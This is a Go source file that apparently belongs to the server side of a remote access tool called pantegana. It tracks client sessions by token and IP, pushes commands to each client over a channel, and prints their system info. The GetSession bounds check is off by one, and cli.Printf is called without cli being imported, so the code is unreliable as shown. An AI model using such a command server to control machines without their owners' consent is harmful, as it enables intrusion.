package server

import (
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"strings"

	client "github.com/elleven11/pantegana/client"
)

type Session struct {
	Token   string
	Cmd     chan string
	Open    bool
	IP      string
	SysInfo client.SysInfo
}

var sessions []Session

// errors
var ErrSessionIsClosed = errors.New("The requested session is closed.")
var ErrSessionDoesNotExist = errors.New("The requested session does not exist.")
var ErrUnrecognizedSessionToken = errors.New("The requested session token does not corelate with any current sessions.")
var ErrUndefinedSession = errors.New("Please define a session with -s.")

func CreateSession(req *http.Request) (int, bool) {
	token := req.Header.Get("token")

	// initialize sessions array
	if sessions == nil {
		sessions = make([]Session, 0)
	}

	index := FindSessionIndexByToken(token)
	if index != -1 {
		return index, false
	}

	session := Session{
		Token: token,
		Cmd:   make(chan string),
		IP:    GetIP(req),
	}

	sessions = append(sessions, session)

	return len(sessions) - 1, true
}

func GetSession(idx int) (*Session, error) {
	if idx > len(sessions) || idx < 0 {
		return &Session{}, ErrSessionDoesNotExist
	}
	return &sessions[idx], nil
}

func (s *Session) WriteToCmd(command string) error {
	if s.Open == false {
		return ErrSessionIsClosed
	}
	s.Cmd <- command
	return nil
}

func FindSessionIndexByToken(token string) int {
	for i := 0; i < len(sessions); i++ {
		if sessions[i].Token == token {
			return i
		}
	}
	return -1
}

func PrettyPrintSessions() {
	header := "||                          Sessions                          ||"
	spacer := strings.Repeat("=", len(header))
	output := fmt.Sprintf("%s\n%s\n%s\n", spacer, header, spacer)
	for i, session := range sessions {
		if session.Open {
			fragment := fmt.Sprintf("|| ID: %d - Token: %s - IP: %s", i, session.Token, session.IP)
			sessionInfo := fmt.Sprintf("%s%s||\n%s\n", fragment, strings.Repeat(" ", len(header)-len(fragment)-2), spacer)
			json, _ := json.MarshalIndent(session.SysInfo, "", "\t")
			sessionInfo = fmt.Sprintf("%s||%s\n%s\n", sessionInfo, json, spacer)
			output += sessionInfo
		}
	}
	cli.Printf("%s", output)
}
